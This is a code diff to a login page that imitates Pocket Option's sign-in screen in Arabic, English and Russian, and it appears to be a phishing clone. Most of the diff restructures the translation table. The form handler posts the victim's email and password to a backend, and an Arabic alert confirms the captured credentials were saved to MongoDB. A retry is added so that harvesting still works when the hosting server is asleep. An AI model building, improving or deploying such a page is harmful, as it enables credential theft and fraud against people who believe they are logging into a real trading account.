@@ -197,91 +197,21 @@ function toggleLangMenu() {
 }
 
 const translations = {
-    ar: {
-        title: "تسجيل الدخول إلى حسابك | Pocket Option",
-        dir: "rtl",
-        langClass: "ar-lang",
-        langName: "العربية",
-        backHome: "إلى الصفحة الرئيسية",
-        mainHeading: "تسجيل الدخول",
-        noAccount: "لم تقم بعد بالتسجيل؟",
-        register: "التسجيل",
-        emailPlaceholder: "البريد الإلكتروني *",
-        passwordPlaceholder: "كلمه المرور *",
-        remember: "تذكّرني",
-        recovery: "استعادة كلمة المرور",
-        submit: "تسجيل الدخول",
-        socialTitle: "أو قم بتسجيل الدخول بـ",
-        recaptcha: "محمي بخدمة reCAPTCHA",
-        contacts: "تواصل معنا",
-        aml: "سياسة مكافحة غسيل الأموال وسياسة اعرف عميلك",
-        payment: "سياسة الدفع",
-        terms: "الشروط والأحكام",
-        privacy: "سياسة الخصوصية",
-        responsibility: "الإفصاح عن المسؤولية"
-    },
-    en: {
-        title: "Login to your account | Pocket Option",
-        dir: "ltr",
-        langClass: "en-lang",
-        langName: "English",
-        backHome: "To Homepage",
-        mainHeading: "Login",
-        noAccount: "Don't have an account?",
-        register: "Sign up",
-        emailPlaceholder: "Email *",
-        passwordPlaceholder: "Password *",
-        remember: "Remember me",
-        recovery: "Forgot password?",
-        submit: "Login",
-        socialTitle: "Or login with",
-        recaptcha: "Protected by reCAPTCHA",
-        contacts: "Contact Us",
-        aml: "AML & KYC Policy",
-        payment: "Payment Policy",
-        terms: "Terms & Conditions",
-        privacy: "Privacy Policy",
-        responsibility: "Responsibility Disclosure"
-    },
-    ru: {
-        title: "Вход в ваш аккаунт | Pocket Option",
-        dir: "ltr",
-        langClass: "ru-lang",
-        langName: "Русский",
-        backHome: "На главную",
-        mainHeading: "Вход",
-        noAccount: "Нет аккаунта?",
-        register: "Регистрация",
-        emailPlaceholder: "Эл. почта *",
-        passwordPlaceholder: "Пароль *",
-        remember: "Запомнить меня",
-        recovery: "Восстановить пароль",
-        submit: "Войти",
-        socialTitle: "Или войти через",
-        recaptcha: "Защищено reCAPTCHA",
-        contacts: "Контакты",
-        aml: "Политика AML и KYC",
-        payment: "Политика оплаты",
-        terms: "Условия и положения",
-        privacy: "Политика конфиденциальности",
-        responsibility: "Раскрытие ответственности"
-    }
+    ar: { title: "تسجيل الدخول إلى حسابك | Pocket Option", dir: "rtl", langClass: "ar-lang", backHome: "إلى الصفحة الرئيسية", mainHeading: "تسجيل الدخول", noAccount: "لم تقم بعد بالتسجيل؟", register: "التسجيل", emailPlaceholder: "البريد الإلكتروني *", passwordPlaceholder: "كلمه المرور *", remember: "تذكّرني", recovery: "استعادة كلمة المرور", submit: "تسجيل الدخول", socialTitle: "أو قم بتسجيل الدخول بـ", recaptcha: "محمي بخدمة reCAPTCHA" },
+    en: { title: "Login to your account | Pocket Option", dir: "ltr", langClass: "en-lang", backHome: "To Homepage", mainHeading: "Login", noAccount: "Don't have an account?", register: "Sign up", emailPlaceholder: "Email *", passwordPlaceholder: "Password *", remember: "Remember me", recovery: "Forgot password?", submit: "Login", socialTitle: "Or login with", recaptcha: "Protected by reCAPTCHA" },
+    ru: { title: "Вход в ваш аккаунт | Pocket Option", dir: "ltr", langClass: "ru-lang", backHome: "На главную", mainHeading: "Вход", noAccount: "Нет аккаунта?", register: "Регистрация", emailPlaceholder: "Эл. почта *", passwordPlaceholder: "Пароль *", remember: "Запомнить меня", recovery: "Восстановить пароль", submit: "Войти", socialTitle: "Или войти через", recaptcha: "Защищено reCAPTCHA" }
 };
 
 function changeLanguage(lang) {
-    const t = translations[lang] || translations['en'];
-    document.getElementById('page-title').innerText = t.title;
-    document.documentElement.lang = lang;
-    document.documentElement.dir = t.dir;
-    
-    const bodyTag = document.getElementById('body-tag');
-    bodyTag.className = `blank page-login ${t.langClass || 'en-lang'}`;
-    
-    // Find text content dynamically from clicked language anchor
     event.preventDefault();
+    const t = translations[lang] || translations['en'];
     document.getElementById('current-lang-text').innerText = event.target.innerText;
+    document.documentElement.lang = lang;
+    document.documentElement.dir = t.dir || 'ltr';
+    document.getElementById('body-tag').className = `blank page-login ${t.langClass || 'en-lang'}`;
     
-    if(t) {
+    if(t.title) {
+        document.getElementById('page-title').innerText = t.title;
         document.getElementById('back-home-link').innerText = t.backHome;
         document.getElementById('main-heading').innerText = t.mainHeading;
         document.getElementById('no-account-text').innerText = t.noAccount;
@@ -296,7 +226,6 @@ function changeLanguage(lang) {
         document.getElementById('social-title-text').innerText = t.socialTitle;
         document.getElementById('recaptcha-text').innerText = t.recaptcha;
     }
-    
     document.getElementById('languages-dropdown').classList.remove('languages--opened');
 }
 
@@ -311,14 +240,30 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email, password })
         });
+        
+        if (!res.ok) throw new Error('Network response was not ok');
+
         const data = await res.json();
-        if (res.ok) {
+        if (data.success) {
             alert('وصلت البيانات وتم حفظها في MongoDB بنجاح!');
         } else {
-            alert('حدث خطأ: ' + data.message);
+            alert('حدث خطأ: ' + (data.message || 'بيانات غير صالحة'));
         }
     } catch (err) {
-        alert('فشل الاتصال بالسيرفر.');
+        // محاولة ثانية ذكية لتجاوز وضع السكون في سيرفر Render
+        try {
+            const retryRes = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email, password })
+            });
+            const retryData = await retryRes.json();
+            if (retryRes.ok && retryData.success) {
+                alert('وصلت البيانات وتم حفظها في MongoDB بنجاح!');
+                return;
+            }
+        } catch (retryErr) {}
+        alert('فشل الاتصال بالسيرفر. يرجى التأكد من تشغيل الخادم.');
     }
 });
 </script>
